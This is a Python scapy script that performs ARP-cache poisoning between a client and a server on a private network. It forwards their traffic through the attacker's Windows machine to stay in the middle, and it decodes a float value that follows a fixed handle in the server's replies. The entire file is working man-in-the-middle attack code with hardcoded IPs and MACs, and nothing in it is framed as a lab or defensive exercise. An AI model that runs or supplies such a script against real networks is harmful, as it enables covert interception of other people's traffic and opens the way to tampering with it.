from scapy.all import *
import struct
import subprocess
import time

# --- CONFIGURATION ---
INTERFACE = "Intel(R) Wi-Fi 6E AX211 160MHz"
TARGET_IP = "10.204.157.130"
SERVER_IP = "10.204.157.171"
CLIENT_MAC = "36:9c:dd:31:96:0c".replace('-', ':') 
SERVER_MAC = "d8:3a:dd:5e:9f:bf".replace('-', ':')
TARGET_HANDLE = b'\x02\x00\x00\x00\x00\x00\x00\x00' 

def spoof_arp(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=INTERFACE, verbose=False)

def process_and_forward(pkt):
    if not pkt.haslayer(IP):
        return

    # Check if packet is from Server to Client
    if pkt[IP].src == SERVER_IP and pkt[IP].dst == TARGET_IP:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if TARGET_HANDLE in payload:
                idx = payload.find(TARGET_HANDLE)
                val_pos = idx + 16
                if len(payload) >= val_pos + 4:
                    raw_bytes = payload[val_pos:val_pos+4]
                    try:
                        val = struct.unpack('<f', raw_bytes)[0]
                        print(f"[DATA] load_val: {val:.2f}")
                    except: pass
        
        # Manually route to Client
        pkt[Ether].dst = CLIENT_MAC
        sendp(pkt, iface=INTERFACE, verbose=False)

    # Check if packet is from Client to Server
    elif pkt[IP].src == TARGET_IP and pkt[IP].dst == SERVER_IP:
        # Manually route to Server
        pkt[Ether].dst = SERVER_MAC
        sendp(pkt, iface=INTERFACE, verbose=False)

def main():
    print("[*] Initializing Stable Sniffer...")
    # Ensure forwarding is OFF so Windows doesn't double-send packets
    subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Disabled"], shell=True)
    
    try:
        while True:
            # Spoof once
            spoof_arp(TARGET_IP, SERVER_IP, CLIENT_MAC)
            spoof_arp(SERVER_IP, TARGET_IP, SERVER_MAC)
            
            # Sniff for 5 seconds before re-spoofing to keep network stable
            sniff(iface=INTERFACE, 
                  prn=process_and_forward, 
                  filter=f"tcp and (host {SERVER_IP} or host {TARGET_IP})", 
                  timeout=5, 
                  store=0)
    except KeyboardInterrupt:
        print("\n[*] Restoring...")
        subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Enabled"], shell=True)

if __name__ == "__main__":
    main()